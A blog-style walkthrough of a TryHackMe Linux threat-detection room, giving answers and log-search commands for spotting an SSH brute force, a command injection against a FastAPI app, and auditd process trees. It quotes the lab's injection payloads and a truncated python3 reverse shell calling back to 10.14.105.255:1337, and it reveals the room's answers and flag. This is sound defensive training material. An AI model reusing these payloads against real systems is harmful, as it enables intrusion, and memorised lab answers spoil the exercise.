---
title: Linux Threat Detection 1 Walkthrough
description: Detect Initial Access techniques and analyze process trees on Linux systems.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

In this room, I practiced detecting common Initial Access techniques on Linux servers using authentication logs, web access logs, and `auditd` process trees. First, I analyzed `/var/log/auth.log` to distinguish between SSH public key logins (`Accepted publickey`) and password logins (`Accepted password`), before investigating a botnet SSH brute-force attack targeting `root, roy, sol, user` and identifying the IP that breached `root` (`91.224.92.79`). Next, I examined `/var/log/nginx/access.log` to uncover an OS command injection attack against the `TryPingMe` FastAPI web application (`/opt/trypingme/main.py`). Using `ausearch`, I reconstructed the full process tree from the injected `whoami` command (`ppid=1018`) up to the `TryPingMe` app (`pid=577`) and identified the `python3` reverse shell payload, finishing with a look at `Supply Chain Compromise` and `Process Tree Analysis`.

---

**Learning Objectives**

- Understand the role and risk of SSH in Linux environments
- Learn how Internet-exposed services can lead to breaches
- Utilize process tree analysis to identify the origin of an attack
- Practice detecting Initial Access techniques in realistic labs

---
## Task 1.1
When did the `ubuntu` user log in via SSH for the first time? (Format: YYYY-MM-DD)

**Answer**: `2024-10-22`

**Why?**
Filtering `/var/log/auth.log` for SSH events associated with the `ubuntu` user (`cat auth.log | grep -iE "sshd" | grep -iE "ubuntu"`) shows the earliest recorded login date with a full year timestamp on `2024-10-22` (`Accepted publickey for ubuntu`).

![](Pasted%20image%2020261109171529.png)
![](Pasted%20image%2020261109171504.png)

## Task 1.2
Did the `ubuntu` user use SSH keys instead of a password for the above found date? (Yea/Nay)

**Answer**: `Yea`

**Why?**
Looking at the `2024-10-22` entries in `auth.log`, the log lines state `Accepted publickey for ubuntu ... ssh2: RSA SHA256:...` rather than `Accepted password`, which only appears later when filtering specifically for `pass`.

![](Pasted%20image%2020261109171605.png)

## Task 2.1
When did the SSH password brute force start? (Format: YYYY-MM-DD)

**Answer**: `2025-08-21`

**Why?**
Searching `/var/log/auth.log` for failed SSH logins with `cat auth.log | grep -iE "ssh" | grep -iE "Failed"` reveals a wave of `Failed password` attempts starting on `2025-08-21` at `16:34:04`.

![](Pasted%20image%2020261109171734.png)

## Task 2.2
Which four users did the botnet attempt to breach? (Format: user1, user2, user3, user4 in alphabetical order)

**Answer**: `root, roy, sol, user`

**Why?**
Inspecting the `Failed password` lines in `auth.log` during the `2025-08-21` brute-force attack shows login attempts targeting `root`, `invalid user sol`, `invalid user roy`, and `invalid user user`. In alphabetical order, the four targeted accounts are `root, roy, sol, user`.

![](Pasted%20image%2020261109171852.png)

## Task 2.3
Finally, which IP managed to breach the root user?

**Answer**: `91.224.92.79`

**Why?**
Filtering `auth.log` for successful root logins (`cat auth.log | grep -iE "ssh" | grep -iE "Accepted" | grep -iE "root"`) shows `Accepted password for root from 91.224.92.79 port 51555 ssh2` right after the brute-force attempts from that same IP.

![](Pasted%20image%2020261109171953.png)

## Task 3.1
What is the path to the Python file the attacker attempted to open?

**Answer**: `/opt/trypingme/main.py`

**Why?**
Checking `/var/log/nginx/access.log` with `cat access.log | grep -iE ".py"` reveals a command injection request sent to the `/ping` endpoint: `GET /ping?host=;cat+/opt/trypingme/main.py HTTP/1.1`.

![](Pasted%20image%2020261109172435.png)

## Task 3.2
Looking inside the opened file, what's the flag you see there?

**Answer**: `THM{i_am_vulnerable!}`

**Why?**
Navigating to `/opt/trypingme` and reading `main.py` (`cat main.py`) shows the vulnerable `subprocess.check_output(cmd, shell=True)` code along with the comment `# THM{i_am_vulnerable!}`.

![](Pasted%20image%2020261109172558.png)

## Task 4.1
What is the PPID of the suspicious `whoami` command?

**Answer**: `1018`

**Why?**
Querying `auditd` logs for `whoami` executions using `ausearch -i -x whoami` shows `proctitle=whoami` executed from `cwd=/opt/trypingme` with `ppid=1018` and `pid=1020`.

![](Pasted%20image%2020261109172814.png)

## Task 4.2
Moving up the tree, what is the PID of the TryPingMe app?

**Answer**: `577`

**Why?**
Searching `auditd` for the parent process `1018` with `ausearch -i --pid 1018` shows `/bin/sh -c ping -c 2 ;whoami`, which itself has `ppid=577` (the `python3 /opt/trypingme/main.py` process).

![](Pasted%20image%2020261109172928.png)

## Task 4.3
Which program did the attacker use to open a reverse shell?

**Answer**: `python3`

**Why?**
Searching the audit logs with `ausearch -i | grep -iE "python3"` (as well as checking `nginx/access.log`) shows the attacker injecting `python3 -c 'import socket,subprocess,os;...'` to spawn an interactive reverse shell back to `10.14.105.255:1337`.

![](Pasted%20image%2020261109173620.png)

## Task 5.1
Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?

**Answer**: `Supply Chain Compromise`

**Why?**
As explained in the **Supply Chain Compromise** section, when attackers compromise a software dependency or update (such as the XZ Utils backdoor), legitimate trusted applications suddenly execute malicious actions upon updating.

![](Pasted%20image%2020261109174316.png)

## Task 5.2
Which detection method can you use to detect a variety of Initial Access techniques?

**Answer**: `Process Tree Analysis`

**Why?**
As shown in the **Detecting the Attacks** diagram, `Process Tree Analysis` lets us start from any suspicious command or network alert and trace the parent-child hierarchy up to the root service (`apache2`, `thm-service`, or `sshd`) to uncover how the breach started.

![](Pasted%20image%2020261109174620.png)